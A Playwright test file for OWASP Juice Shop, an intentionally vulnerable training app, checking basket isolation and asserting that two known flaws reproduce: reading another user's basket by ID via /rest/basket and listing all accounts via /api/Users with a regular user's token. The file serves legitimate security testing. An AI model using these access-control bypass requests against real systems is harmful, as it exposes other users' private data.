import { test, expect } from '@playwright/test';
import { addProduct, bearer, createUser, signInContext } from './helpers';

// Target: OWASP Juice Shop, an intentionally vulnerable training app.
// Test 1 checks isolation that works. Tests 2 and 3 assert that two KNOWN,
// built-in weaknesses are reproduced: they pass only when the other user's
// data is actually returned, so any other failure turns the run red.

const APPLE = 1;  // Apple Juice (1000ml)
const ORANGE = 2; // Orange Juice (1000ml)

test('two users in isolated browser contexts each see only their own basket', async ({ browser, request, baseURL }) => {
  const a = await createUser(request, 'user-a');
  const b = await createUser(request, 'user-b');
  await addProduct(request, a, APPLE);
  await addProduct(request, b, ORANGE);

  const ctxA = await browser.newContext();
  const ctxB = await browser.newContext();
  await signInContext(ctxA, a, baseURL!);
  await signInContext(ctxB, b, baseURL!);
  const pageA = await ctxA.newPage();
  const pageB = await ctxB.newPage();

  await pageA.goto('/#/basket');
  await pageB.goto('/#/basket');

  await expect(pageA.getByText('Apple Juice (1000ml)')).toBeVisible();
  await expect(pageA.getByText('Orange Juice (1000ml)')).toHaveCount(0);
  await expect(pageB.getByText('Orange Juice (1000ml)')).toBeVisible();
  await expect(pageB.getByText('Apple Juice (1000ml)')).toHaveCount(0);

  await ctxA.close();
  await ctxB.close();
});

test('known weakness: user A can read user B basket by ID through the API', async ({ request }) => {
  const a = await createUser(request, 'user-a');
  const b = await createUser(request, 'user-b');
  await addProduct(request, b, ORANGE);

  const res = await request.get(`/rest/basket/${b.basketId}`, { headers: bearer(a) });
  const body = await res.json();
  const products: number[] = (body?.data?.Products ?? []).map((p: { id: number }) => p.id);
  test.info().annotations.push({
    type: 'observed',
    description: `status ${res.status()}, basket owner ${body?.data?.UserId}, requester ${a.userId}, products ${products.join(',')}`,
  });

  expect(res.status()).toBe(200);
  expect(body.data.UserId, 'basket belongs to B').toBe(b.userId);
  expect(b.userId).not.toBe(a.userId);
  expect(products, 'B item visible to A').toContain(ORANGE);
});

test('known weakness: regular user can list all user accounts through the API', async ({ request }) => {
  const a = await createUser(request, 'user-a');
  const b = await createUser(request, 'user-b');

  const res = await request.get('/api/Users', { headers: bearer(a) });
  const body = await res.json();
  const emails: string[] = (body?.data ?? []).map((u: { email: string }) => u.email);
  test.info().annotations.push({
    type: 'observed',
    description: `status ${res.status()}, accounts returned ${emails.length}`,
  });

  expect(res.status()).toBe(200);
  expect(emails, 'B account visible to A').toContain(b.email);
});
